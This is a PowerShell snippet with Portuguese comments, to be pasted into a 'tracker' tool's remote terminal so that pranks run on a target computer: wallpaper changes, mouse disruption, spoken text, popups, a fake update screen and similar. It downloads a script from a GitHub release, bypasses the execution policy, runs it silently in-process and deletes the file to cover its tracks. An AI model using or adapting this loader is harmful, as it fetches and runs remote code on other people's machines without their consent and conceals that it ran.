# ==========================================================
#  COLE ISSO NO "Terminal PowerShell" DO TRACKER E ENVIE
#  (baixa o script hospedado, roda, e apaga o arquivo temporario)
# ==========================================================

# --- escolha aqui ---
$OPCAO = "2"     # 1=wallpaper 2=mouse 3=fala 4=popup 5=capslock 6=rapido 7=lento 8=bebado 9=atualizacao-falsa R=restaurar
$LINK  = ""      # SO para a opcao 1: link publico DIRETO da imagem (termina em .jpg/.png)
$FRASE = ""      # SO para a opcao 3: o que o PC vai falar (vazio = frase padrao)
$MSG   = ""      # SO para a opcao 4: texto do popup (vazio = texto padrao)
$DUR   = ""      # SO para a opcao 9: segundos ate a tela fechar sozinha (vazio = 60; Esc fecha na hora)

# --- onde voce hospedou o zoeira-tracker.ps1 ---
$URL = "https://github.com/gbrcosta/zoeira-getel/releases/download/v1.0/zoeira-tracker.ps1"

# --- nao precisa mexer daqui pra baixo ---
$f = Join-Path $env:TEMP "z.ps1"
try {
    $ProgressPreference = 'SilentlyContinue'
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $URL -OutFile $f -UseBasicParsing -Headers @{ 'User-Agent' = 'Mozilla/5.0' }

    # Roda o script no MESMO processo (nao abre janela/processo extra)
    Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
    $p = @{ OPCAO = $OPCAO }
    if ($LINK)  { $p.LINK  = $LINK }
    if ($FRASE) { $p.FRASE = $FRASE }
    if ($MSG)   { $p.MSG   = $MSG }
    if ($DUR)   { $p.DUR   = $DUR }
    & $f @p
}
finally {
    Remove-Item $f -Force -ErrorAction SilentlyContinue
}
